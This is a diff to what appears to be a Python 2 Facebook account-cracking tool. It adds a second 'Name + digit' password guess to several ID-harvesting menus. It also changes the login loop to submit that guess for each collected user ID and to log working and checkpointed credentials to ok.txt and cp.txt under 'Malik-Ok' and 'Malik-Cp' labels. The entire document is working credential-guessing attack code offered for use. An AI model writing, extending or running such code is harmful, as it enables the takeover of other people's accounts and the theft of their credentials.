@@ -241,6 +241,7 @@ def a_menu_select():
 		os.system('echo -e "\t    Public ID Menu " | lolcat')
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+		p2 = raw_input(' \033[1;92m[2]Name + digit: ')
 		idt = raw_input(" Enter ID/Username :  ")
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		time.sleep(2)
@@ -279,6 +280,7 @@ def a_menu_select():
 		os.system('echo -e "\t    Followers ID Menu " | lolcat')
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+		p2 = raw_input(' \033[1;92m[2]Name + digit: ')
 		idt = raw_input(" Enter ID/Username : ")
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		time.sleep(2)
@@ -317,6 +319,7 @@ def a_menu_select():
 		print("")
 		print("")
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+		p2 = raw_input(' \033[1;92m[2]Name + digit: ')
 		try:
 	                uidlist = raw_input('[+] File Name: ')
 			os.system('echo -e "-----------------------------------------------"| lolcat')
@@ -554,20 +557,20 @@ def b_menu_select():
                         cp.close()
                         cps.append(uid + pass1)
 		    else:
-			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                         q = json.loads(data)
                         if "loc" in q:
-                            print("\033[1;92m[Malik-Ok]➤ " + uid + " | " + pass1+" | "+name)
+                            print("\033[1;92m[Malik-Ok]➤ " + uid + " | " + pass2+" | "+name)
                             ok=open("ok.txt","a")
-                            ok.write(uid+" | "+pass1+"\n")
+                            ok.write(uid+" | "+pass2+"\n")
                             ok.close()
-                            oks.append(uid + pass1)
+                            oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
-                            print("\033[1;93m[Malik-Cp]➤ " + uid + " | " + pass1+" | "+name)
+                            print("\033[1;93m[Malik-Cp]➤ " + uid + " | " + pass2+" | "+name)
                             cp=open("cp.txt","a")
-                            cp.write(uid+" | "+pass1+"\n")
+                            cp.write(uid+" | "+pass2+"\n")
                             cp.close()
-                            cps.append(uid + pass1)
+                            cps.append(uid + pass2)
 		except:
 			pass
 		
